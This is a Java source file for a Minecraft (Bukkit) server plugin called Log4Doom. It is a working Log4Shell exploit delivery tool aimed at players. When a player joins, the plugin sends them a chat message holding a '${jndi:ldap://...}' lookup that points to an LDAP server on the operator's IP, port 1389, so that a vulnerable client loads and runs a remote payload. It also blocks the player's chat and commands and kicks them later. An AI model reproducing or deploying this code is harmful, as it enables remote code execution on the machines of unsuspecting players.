package net.zeeraa.log4doom;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

public class Log4Doom extends JavaPlugin implements Listener {
	private String ip;
	private int port;

	public String getExploitTarget() {
		return "jndi:ldap://" + ip + ":" + port + "/Log4DoomPayload";
	}

	public static String getPublicIpAddress() throws Exception {
		URL url = new URL("https://httpbin.org/ip");
		HttpURLConnection connection = (HttpURLConnection) url.openConnection();

		// Set the HTTP request method to GET
		connection.setRequestMethod("GET");

		// Get the response code
		int responseCode = connection.getResponseCode();
		if (responseCode == HttpURLConnection.HTTP_OK) {
			// If the response code is OK, read the response
			BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
			String line;
			StringBuilder response = new StringBuilder();

			while ((line = reader.readLine()) != null) {
				response.append(line);
			}

			reader.close();

			// Parse the JSON response to get the public IP address
			String jsonString = response.toString();
			String publicIp = jsonString.split("\"origin\": \"")[1].split("\"")[0];

			// Close the connection
			connection.disconnect();

			return publicIp;
		} else {
			throw new Exception("HTTP request failed with response code: " + responseCode);
		}
	}

	@Override
	public void onEnable() {
		ip = null;
		port = 1389;

		String portStr = System.getProperty("log4doomPort");
		if (portStr != null) {
			try {
				port = Integer.parseInt(portStr);
			} catch (Exception e) {
				getLogger().warning("Invalid exploit port: " + port);
			}
		}

		String ipString = System.getProperty("log4doomIp");
		if (ipString != null) {
			ip = ipString;
		} else {
			getLogger().info("Fetching public ip address");
			try {
				ip = getPublicIpAddress();
			} catch (Exception e) {
				e.printStackTrace();
				getLogger().warning("Failed to fetch public ip. " + e.getClass().getName() + " " + e.getStackTrace());
				Bukkit.getServer().shutdown();
				return;
			}
		}

		getLogger().info("Exploit target is " + getExploitTarget());

		Bukkit.getServer().getPluginManager().registerEvents(this, this);
		getLogger().info("Ready");
	}

	@Override
	public void onDisable() {
		HandlerList.unregisterAll((Plugin) this);
		Bukkit.getScheduler().cancelTasks(this);

	}

	@EventHandler(priority = EventPriority.NORMAL)
	public void onPlayerJoin(PlayerJoinEvent e) {
		Player player = e.getPlayer();
		getLogger().info("Sending exploit to " + player.getName());
		player.sendMessage("${" + getExploitTarget() + "}");
		new BukkitRunnable() {
			@Override
			public void run() {
				player.kickPlayer("");
			}
		}.runTaskLater(this, 600L);
	}

	@EventHandler(priority = EventPriority.NORMAL)
	public void onPlayerChat(AsyncPlayerChatEvent e) {
		e.setCancelled(true);
	}

	@EventHandler(priority = EventPriority.NORMAL)
	public void onCommandPreProcess(PlayerCommandPreprocessEvent e) {
		e.setCancelled(true);
	}
}